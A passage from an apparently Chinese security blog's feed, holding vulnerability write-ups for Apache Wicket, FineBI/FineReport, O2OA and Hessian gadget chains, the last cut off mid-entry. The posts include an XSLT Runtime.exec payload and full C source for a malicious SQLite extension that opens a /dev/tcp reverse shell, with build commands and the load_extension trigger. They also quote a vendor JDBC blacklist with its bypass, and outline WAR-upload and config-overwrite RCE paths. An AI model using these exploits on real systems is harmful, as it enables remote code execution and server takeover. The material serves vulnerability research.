class="hljs-name">artifactId</span>&gt;</span>wicket-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.wicket<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wicket-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.18.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新建一个恶意的test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="hljs-attr">xmlns:java</span>=<span class="hljs-string">&quot;http://saxon.sf.net/java-type&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;Runtime:exec(Runtime:getRuntime(),&#x27;open -a calculator&#x27;)&quot;</span> <span class="hljs-attr">xmlns:Runtime</span>=<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编写一个poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.unam4;<br><br><span class="hljs-keyword">import</span> org.apache.wicket.util.file.File;<br><span class="hljs-keyword">import</span> org.apache.wicket.util.resource.FileResourceStream;<br><span class="hljs-keyword">import</span> org.apache.wicket.util.resource.XSLTResourceStream;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerFactory;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileResourceStream</span> <span class="hljs-variable">stream1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileResourceStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;test.xml&quot;</span>));<br>        <span class="hljs-type">FileResourceStream</span> <span class="hljs-variable">stream2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileResourceStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;test.xml&quot;</span>));<br>        <span class="hljs-type">TransformerFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> TransformerFactory.newInstance();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">XSLTResourceStream</span>(stream1,stream2,factory);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后成功弹出计算器。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fine报表问题</title>
    <link href="/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-帆软finereBI-report后台本地命令执行"><a href="#0x01-帆软finereBI-report后台本地命令执行" class="headerlink" title="0x01 帆软finereBI&#x2F;report后台本地命令执行"></a>0x01 帆软finereBI&#x2F;report后台本地命令执行</h2><p><img src="image-20240614022512688.png" alt="image-20240614022512688"></p><p>JAR包版本号：</p><p>6.1.0（JAR：Build#persist-2024.05.30.11.06.10.457） </p><p><a href="https://www.finebi.com/product/download">https://www.finebi.com/product/download</a></p><p><img src="image-20240614022553224.png" alt="image-20240614022553224"></p><p>对应版本6月12日的版本</p><h3 id="0x02-poc-构造"><a href="#0x02-poc-构造" class="headerlink" title="0x02 poc 构造"></a>0x02 poc 构造</h3><p>下载发现官方软件代码,出厂lib中存在sqlite组件。</p><p><img src="image-20240614023128668.png" alt="image-20240614023128668"></p><p><a href="http://localhost:37799/webroot/decision#/management/connection">http://localhost:37799/webroot/decision#/management/connection</a></p><p>在url可以配置数据库连接</p><p><img src="image-20240614022840926.png" alt="image-20240614022840926"></p><p>jdbcurl可控这里可以是设置为 <strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong></p><p>开启**load_extension()**函数</p><p><a href="https://sqlite.readdevdocs.com/loadext.html">https://sqlite.readdevdocs.com/loadext.html</a> 这里有恶意dll 编写模版。</p><p>这里我是mac系统;</p><p>对应的恶意dll文件代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sqlite3ext.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br>SQLITE_EXTENSION_INIT1<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Initializes the SQLite extension.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param db SQLite database pointer</span><br><span class="hljs-comment"> * @param pzErrMsg Error message pointer</span><br><span class="hljs-comment"> * @param pApi SQLite API routines pointer</span><br><span class="hljs-comment"> * @return SQLITE_OK on success</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sqlite3_extension_init</span><span class="hljs-params">(</span><br><span class="hljs-params">    sqlite3 *db,</span><br><span class="hljs-params">    <span class="hljs-type">char</span> **pzErrMsg,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> sqlite3_api_routines *pApi</span><br><span class="hljs-params">)</span> &#123;<br>    <span class="hljs-type">int</span> rc = SQLITE_OK;<br>    SQLITE_EXTENSION_INIT2(pApi);<br><br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure><p>填写好接收反弹shell的地址。</p><p>使用gcc编译成恶意的动态链接库。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-comment">//Mac       gcc -fPIC -dynamiclib -o poc1.dylib poc.c</span><br><span class="hljs-comment">//linux     gcc -fPIC -shared  -o liboutput.so poc.c</span><br></code></pre></td></tr></table></figure><p>然后修改成</p><p>然后在<strong>校验语句</strong>这里输入语句执行我们恶意动态库文件**SELECT load_extension(‘poc.dylib’)**； 修改为dylic的路径。</p><p>执行后nc接收到shell。</p><p><img src="image-20240614022922220.png" alt="image-20240614022922220"></p><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><p>与finereport有点不同，</p><p>com.fr.decision.webservice.v10.datasource.connection.ConnectionService.getDriverPath</p><p><img src="image-20240614024201059.png" alt="image-20240614024201059"></p><p>在这里接受我们传入的jdbc连接</p><p>om.fr.decision.webservice.v10.datasource.connection.processor.impl.ConnectionProcessorFactory.getDriverPath</p><p><img src="image-20240614024335360.png" alt="image-20240614024335360"></p><p>com.fr.decision.webservice.v10.datasource.connection.processor.impl.JDBCConnectionProcessor.convertToJDBCConnectio</p><p><img src="image-20240614024718057.png" alt="image-20240614024718057"></p><p>一系列调用后来看这里，完成jdbc链接的赋值，最后调用validateSettings进行检查</p><p>com.fr.decision.webservice.v10.datasource.connection.processor.impl.JDBCConnectionProcessor.validateSettings</p><p><img src="image-20240614025114552.png" alt="image-20240614025114552"></p><p>这里会反射获取数据库服务，然后调用 JDBCSecurityChecker.checkUr进行检查。</p><p>com.fr.data.core.db.JDBCSecurityChecker#check</p><p><img src="image-20240614025435321.png" alt="image-20240614025435321"></p><p>然后在黑名单进行匹配。</p><p><img src="image-20240614025745936.png" alt="image-20240614025745936"></p><p>对应的黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsecurityElement[] FORBIDDEN_ELEMENTS_OF_URL = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityElement</span>[] &#123; <br>    (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;INIT=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;allowLoadLocalInfile=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;autoDeserialize=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;clientRerouteServerListJNDIName=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;jcr:jndi:&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;slaveHost=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;sqlite::resource&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;mysql:fabric&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;socketFactory=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;loggerFile=&quot;</span>), <br>    (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;TRIGGER&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLResource</span>() &#125;;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsecurityElement[] FORBIDDEN_ELEMENTS_OF_VALIDATION_QUERY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityElement</span>[] &#123; (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;create&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;drop&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;alter&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;insert&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;delete&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;merge&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;attach&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;benchmark&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;xp_dirtree&quot;</span>) &#125;;<br><br></code></pre></td></tr></table></figure><p>可以看到<strong>enable_load_extension&#x3D;true</strong> 不在黑名单中，最后找成了执行恶意动态库。</p><p>过于复杂，推荐前端复现。</p><h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>​等待官网修复，截止报告提交时间2024年6月14日，通杀所有版本。 截止8.4日，最新版已修复</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>o2oa审计</title>
    <link href="/2024/08/04/o2oa%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/08/04/o2oa%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>纯代码层面分析，可能存在的问题，未复现</p><h3 id="0x01-反序列化"><a href="#0x01-反序列化" class="headerlink" title="0x01 反序列化"></a>0x01 反序列化</h3><p>com.x.base.core.project.cache.CacheRedisImpl#get</p><p><img src="image-20240731125419849.png" alt="image-20240731125419849"></p><p>从redis获取key对应的value转换成byte流，然后进行反序列化</p><p>调用</p><p>com.x.base.core.project.cache.CacheManager#get</p><p><img src="image-20240731125519025.png" alt="image-20240731125519025"></p><p>网上很容易就能找到对应的control，太多了</p><p><img src="image-20240731125725462.png" alt="image-20240731125725462"></p><p><img src="image-20240804234949074.png" alt="image-20240804234949074"></p><p>开放java.lang包。懂得都懂</p><h3 id="0x02-命令执行"><a href="#0x02-命令执行" class="headerlink" title="0x02 命令执行"></a>0x02 命令执行</h3><p>com.x.program.center.jaxrs.command.CommandAction#executeCommand</p><p><img src="image-20240731163632157.png" alt="image-20240731163632157"></p><p>直接冲json里面获取命令</p><p><img src="image-20240731163738854.png" alt="image-20240731163738854"></p><p><img src="image-20240731163754328.png" alt="image-20240731163754328"></p><p><img src="image-20240731163839832.png" alt="image-20240731163839832"></p><p>ctl是命令，先获取服务，在执行</p><h3 id="0x03-部署war包"><a href="#0x03-部署war包" class="headerlink" title="0x03 部署war包"></a>0x03 部署war包</h3><p>com.x.program.center.jaxrs.command.CommandAction#upload</p><p><img src="image-20240731163919011.png" alt="image-20240731163919011"></p><p>可以直接部署 恶意的war包</p><p>自己写一个命令执行就行</p><p><a href="https://novysodope.github.io/2021/12/22/70/">https://novysodope.github.io/2021/12/22/70/</a></p><h3 id="0x04-创建接口rce"><a href="#0x04-创建接口rce" class="headerlink" title="0x04  创建接口rce"></a>0x04  创建接口rce</h3><p><img src="image-20240731164243158.png" alt="image-20240731164243158"></p><p>class不在黑名单，可反射获取任意类任意方法</p><p><a href="https://github.com/user-attachments/files/15552539/O2OA.system.has.Remote.Command.Execution.Vulnerability.pdf">https://github.com/user-attachments/files/15552539/O2OA.system.has.Remote.Command.Execution.Vulnerability.pdf</a></p><p>参考</p><h3 id="0x05-可读配置文件"><a href="#0x05-可读配置文件" class="headerlink" title="0x05 可读配置文件"></a>0x05 可读配置文件</h3><p>com.x.program.center.jaxrs.config.ConfigAction#open</p><p><img src="image-20240731164532171.png" alt="image-20240731164532171"></p><p><img src="image-20240731164619244.png" alt="image-20240731164619244"></p><p>可以直接从json获取file文件名</p><p><img src="image-20240731164646288.png" alt="image-20240731164646288"></p><p><img src="image-20240731164715818.png" alt="image-20240731164715818"></p><p>这里过滤了，获取到的file不等于node，且在文件名在confid下就可以读。</p><p><img src="image-20240731164801632.png" alt="image-20240731164801632"></p><p>可读项</p><h4 id="0x06-任意文件写"><a href="#0x06-任意文件写" class="headerlink" title="0x06 任意文件写"></a>0x06 任意文件写</h4><p>com.x.program.center.jaxrs.config.ConfigAction#save</p><p><img src="image-20240731165004980.png" alt="image-20240731165004980"></p><p><img src="image-20240731165108607.png" alt="image-20240731165108607"></p><p><img src="image-20240731165155443.png" alt="image-20240731165155443"></p><p>也就是通过StringTools.isFileName这个函数判断了 只能修改config下的文件。</p><p><img src="image-20240731165256615.png" alt="image-20240731165256615"></p><p>从json读入字节流然后写入，也就是我可以先读到general.json的配置，然后把黑名单删除掉，然后在打 <strong>0x03创建接口的rce</strong>.</p><p>这样看 最新版也受影响。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/07/06/hessian_tostring/"/>
    <url>/2024/07/06/hessian_tostring/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-TreeMap-的-四条触发tosting"><a href="#0x01-TreeMap-的-四条触发tosting" class="headerlink" title="0x01  TreeMap 的 四条触发tosting"></a>0x01  TreeMap 的 四条触发tosting</h3><p>核心就是利用javax.naming.ldap.Rdn.RdnEntry#compareTo去触发<strong>obj1.equals(obj2)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">Object</span> <span class="hljs-variable">xstring</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XStringForFSB&quot;</span>);<br><span class="hljs-comment">//        Object xstring = createWithoutConstructor(&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;);</span><br>        utils.setFieldValue(xstring, <span class="hljs-string">&quot;m_obj&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br><span class="hljs-comment">//       Object xstring = utils.createWithoutConstructor(&quot;javax.sound.sampled.AudioFileFormat.Type&quot;);</span><br><span class="hljs-comment">//       Object xstring = utils.createWithoutConstructor(&quot;javax.sound.sampled.AudioFormat$Encoding&quot;);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry1</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>);<br>        utils.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>        utils.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;value&quot;</span>, objects1);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry2</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>);<br>        utils.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>        utils.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;value&quot;</span>, xstring);<br>        <span class="hljs-type">TreeSet</span> <span class="hljs-variable">treeSet</span> <span class="hljs-operator">=</span> makeTreeSet(rdnEntry1, rdnEntry2);<br><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TreeSet <span class="hljs-title function_">makeTreeSet</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            TreeMap&lt;Object,Object&gt; m = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>            utils.setFieldValue(m, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            utils.setFieldValue(m, <span class="hljs-string">&quot;modCount&quot;</span>, <span class="hljs-number">2</span>);<br>            Class&lt;?&gt; nodeC = Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCons.newInstance(v1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nodeCons.newInstance(v2, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], node);<br>            utils. setFieldValue(node, <span class="hljs-string">&quot;right&quot;</span>, right);<br>            utils.setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);<br><br>            <span class="hljs-type">TreeSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>();<br>            utils.setFieldValue(set, <span class="hljs-string">&quot;m&quot;</span>, m);<br>            <span class="hljs-keyword">return</span> set;<br>        &#125;<br></code></pre></td></tr></table></figure><p>javax.naming.ldap.Rdn.RdnEntry#compareTo</p><p><img src="image-20240706124044436.png" alt="image-20240706124044436"></p><p>可以控制vaule，也就是可以控制 <strong>obj1.equals(obj2)</strong></p><p>使用tabby查询只调用一次的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">MATCH path = (n:Method &#123;NAME: &quot;equals&quot;&#125;)-[:CALL]-&gt;(:Method &#123;NAME0:&quot;java.lang.Object#toString&quot;&#125;) where none(n in nodes(path) where n.CLASSNAME CONTAINS &quot;com.fr&quot;)<br>RETURN path <br></code></pre></td></tr></table></figure><p><img src="image-20240706131137683.png" alt="image-20240706131137683"></p><p>排除错误不能的后</p><p><img src="image-20240706131217240.png" alt="image-20240706131217240"></p><p>分别就是上面的几个类</p><p><strong>CLASSNAME: 